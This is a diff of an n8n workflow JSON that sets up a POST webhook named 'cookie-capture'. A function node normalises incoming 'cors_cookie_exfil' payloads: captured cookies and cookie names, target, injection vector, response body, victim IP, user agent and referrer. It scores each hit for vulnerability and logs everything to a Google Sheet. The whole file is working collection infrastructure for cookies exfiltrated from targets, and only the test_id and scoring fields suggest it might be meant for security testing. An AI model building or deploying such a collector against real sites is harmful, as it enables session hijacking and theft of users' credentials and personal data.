@@ -2,32 +2,44 @@
   "nodes": [
     {
       "parameters": {
-        "httpMethod": "GET",
+        "httpMethod": "POST",
         "path": "cookie-capture",
         "options": {}
       },
-      "name": "Webhook1",
+      "name": "Webhook",
       "type": "n8n-nodes-base.webhook",
       "typeVersion": 2,
       "position": [
-        -608,
-        48
+        -96,
+        16
       ],
       "id": "",
       "webhookId": ""
     },
     {
       "parameters": {
-        "functionCode": "const data = $input.first().json;\n\nreturn {\n  event: data.event || 'cookie_capture',\n  target: data.target,\n  timestamp: data.timestamp || new Date().toISOString(),\n  cookie_count: data.cookie_names ? data.cookie_names.length : 0,\n  cookie_names: data.cookie_names || [],\n  cookies: data.cookies || {},\n  ip: (data.headers && data.headers['x-forwarded-for']) || 'unknown'\n};"
+        "functionCode": "const item = $input.first();\nconst json = item.json || {};\nconst headers = json.headers || {};\n\n// Parse response_body only if it's a string (Monster sometimes stringifies it)\nlet responseBody = {};\nif (json.response_body) {\n  if (typeof json.response_body === 'object') {\n    responseBody = json.response_body;\n  } else if (typeof json.response_body === 'string') {\n    try { responseBody = JSON.parse(json.response_body); } catch (e) { responseBody = { raw: json.response_body }; }\n  }\n}\n\n// Best-effort client IP (works behind Cloudflare, Nginx, etc.)\nconst getClientIp = () => {\n  const ips = [\n    headers['x-forwarded-for'],\n    headers['cf-connecting-ip'],\n    headers['x-real-ip'],\n    headers['true-client-ip'],\n    headers['x-client-ip']\n  ].filter(Boolean);\n  return ips.length ? ips[0].split(',')[0].trim() : 'unknown';\n};\n\n// Simple vulnerability score\nconst getScore = () => {\n  let s = 0;\n  if (json.success) s += 60;\n  if (json.status === 200) s += 20;\n  if (json.cookie_names?.length > 0) s += 15;\n  if (json.timing_delta_ms > 50) s += 5;\n  return s;\n};\n\nreturn {\n  event: json.event || 'cors_cookie_exfil',\n  target: json.target || null,\n  success: !!json.success,\n  injection_vector: json.injection_vector || 'unknown',\n  status: json.status ?? null,\n\n  timestamp: json.timestamp ? new Date(json.timestamp).toISOString() : new Date().toISOString(),\n  timestamp_received: new Date().toISOString(),\n\n  cookie_count: Array.isArray(json.cookie_names) ? json.cookie_names.length : 0,\n  cookie_names: Array.isArray(json.cookie_names) ? json.cookie_names : [],\n  cookies: typeof json.cookies === 'object' && json.cookies !== null ? json.cookies : {},\n\n  response_body: responseBody,\n  timing_delta_ms: json.timing_delta_ms ?? null,\n  vuln_score: getScore(),\n\n  ip: getClientIp(),\n  user_agent: headers['user-agent'] || null,\n  referrer: headers.referer || headers.referrer || null,\n\n  raw_payload: json\n};"
       },
-      "name": "Process Data",
+      "name": "Normalize Monster Payload",
       "type": "n8n-nodes-base.function",
       "typeVersion": 1,
       "position": [
-        -416,
-        48
+        128,
+        16
       ],
-      "connections": {},
+      "id": ""
+    },
+    {
+      "parameters": {
+        "options": {}
+      },
+      "name": "Set Success Response",
+      "type": "n8n-nodes-base.set",
+      "typeVersion": 2,
+      "position": [
+        352,
+        16
+      ],
       "id": ""
     },
     {
@@ -51,7 +63,7 @@
           "mappingMode": "autoMapInputData",
           "value": {},
           "matchingColumns": [
-            "timestamp"
+            "test_id"
           ],
           "schema": [
             {
@@ -61,7 +73,8 @@
               "defaultMatch": false,
               "display": true,
               "type": "string",
-              "canBeUsedToMatch": true
+              "canBeUsedToMatch": true,
+              "removed": false
             },
             {
               "id": "timestamp",
@@ -70,8 +83,7 @@
               "defaultMatch": false,
               "display": true,
               "type": "string",
-              "canBeUsedToMatch": true,
-              "removed": false
+              "canBeUsedToMatch": true
             },
             {
               "id": "ip",
@@ -162,6 +174,141 @@
               "display": true,
               "type": "string",
               "canBeUsedToMatch": true
+            },
+            {
+              "id": "event",
+              "displayName": "event",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "cookie_count",
+              "displayName": "cookie_count",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "cookie_names",
+              "displayName": "cookie_names",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "cookies",
+              "displayName": "cookies",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "target",
+              "displayName": "target",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "timestamp_received",
+              "displayName": "timestamp_received",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "referrer",
+              "displayName": "referrer",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "raw_payload",
+              "displayName": "raw_payload",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "fingerprint",
+              "displayName": "fingerprint",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "success",
+              "displayName": "success",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "injection_vector",
+              "displayName": "injection_vector",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "status",
+              "displayName": "status",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "response_body",
+              "displayName": "response_body",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "timing_delta_ms",
+              "displayName": "timing_delta_ms",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
+            },
+            {
+              "id": "vuln_score",
+              "displayName": "vuln_score",
+              "required": false,
+              "defaultMatch": false,
+              "display": true,
+              "type": "string",
+              "canBeUsedToMatch": true
             }
           ],
           "attemptToConvertTypes": false,
@@ -172,8 +319,8 @@
       "type": "n8n-nodes-base.googleSheets",
       "typeVersion": 4.7,
       "position": [
-        -208,
-        48
+        576,
+        16
       ],
       "id": "",
       "name": "Append or update row in sheet",
@@ -186,18 +333,29 @@
     }
   ],
   "connections": {
-    "Webhook1": {
+    "Webhook": {
       "main": [
         [
           {
-            "node": "Process Data",
+            "node": "Normalize Monster Payload",
             "type": "main",
             "index": 0
           }
         ]
       ]
     },
-    "Process Data": {
+    "Normalize Monster Payload": {
+      "main": [
+        [
+          {
+            "node": "Set Success Response",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Set Success Response": {
       "main": [
         [
           {
